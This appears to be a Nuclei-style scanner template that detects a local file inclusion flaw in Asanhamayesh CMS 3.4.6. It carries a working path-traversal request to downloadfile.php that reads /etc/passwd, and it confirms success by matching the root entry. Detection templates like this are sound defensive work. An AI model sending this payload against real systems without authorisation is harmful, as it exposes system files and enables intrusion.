id: asanhamayesh-lfi

info:
  name: Asanhamayesh CMS 3.4.6 - Local File Inclusion
  author: 0x_Akoko
  severity: high
  description: Asanhamayesh CMS 3.4.6 is vulnerable to local file inclusion.
  reference:
    - https://cxsecurity.com/issue/WLB-2018030006
    - https://asanhamayesh.com
  classification:
    cpe: cpe:2.3:a:asanhamayesh:asanhamayesh:*:*:*:*:*:*:*:*
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-23,CWE-73
  metadata:
    max-request: 1
    vendor: asanhamayesh
    product: asanhamayesh
  tags: asanhamayesh,lfi,traversal,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/downloadfile.php?file=../../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        name: asanhamayesh
        cpe: cpe:2.3:a:asanhamayesh:asanhamayesh:*:*:*:*:*:*:*:*
        regex:
          - "root:[x*]:0:0"

      - type: status
        status:
          - 200
